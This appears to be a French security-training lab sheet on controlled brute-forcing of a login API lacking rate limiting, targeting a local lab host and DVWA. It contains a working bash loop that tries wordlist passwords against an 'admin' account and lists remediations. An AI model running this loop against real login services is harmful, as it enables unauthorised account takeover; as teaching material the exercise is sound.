# J3-C01 — Brute-force contrôlé

## Objectif
Comprendre le risque d’un login sans rate limiting.

## Cibles autorisées
Auth API `/login` et DVWA `Brute Force`.

## Auth API
```bash
while read pwd; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X POST http://authapi.target.local:5001/login \
    -d "username=admin&password=$pwd")
  echo "$pwd -> $code"
done < wordlists/passwords-small.txt
```

## Preuve attendue
Compte trouvé avec petite wordlist, absence de blocage visible, remédiations : rate limiting, lockout progressif, MFA, logs.
